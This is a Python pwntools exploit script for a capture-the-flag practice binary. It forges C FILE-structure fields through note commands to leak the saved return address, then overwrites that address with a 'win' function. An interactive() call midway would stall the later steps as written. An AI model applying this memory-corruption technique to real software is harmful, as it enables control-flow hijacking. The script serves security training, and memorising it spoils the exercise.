from pwn import * 

p = process('./babyfile_level14')

s = '''
b * fwrite
b * challenge+1684
'''


p.recvuntil("writing to is: ")
cmd_addr = int(p.recvline().strip(), 16)
print("cmd address @ ", hex(cmd_addr))

rip = cmd_addr + 0x98

print("rip @ ", hex(rip))



# leaking win
p.sendline("open_file")
p.sendline("new_note 0 248")
p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(rip) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(rip)
payload += p64(rip+0x120) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout

#gdb.attach(p, s)
#time.sleep(2)

p.sendline(payload)


p.sendline("write_file 0")

p.interactive()
p.recvuntil("> fwrite(notes[0], 1, 248, fp);\n")
win = u64(p.recv(8)) - 0xdfc # offset between return address and win
print("win @ ", hex(win))


p.sendline("del_note 0")
# writing rip

p.sendline("new_note 0 248")


p.sendline("write_fp")


offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(rip)
payload += p64(rip + 0x100)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)
p.sendline(payload)

p.sendline(b"read_file 0")
payload2 = p64(win)
payload2 = payload2.ljust(248, b'\x41')  # Assign the result back, because ljust returns a new object
p.sendline(payload2)

gdb.attach(p, s)
time.sleep(1)
p.sendline("quit")


p.interactive()
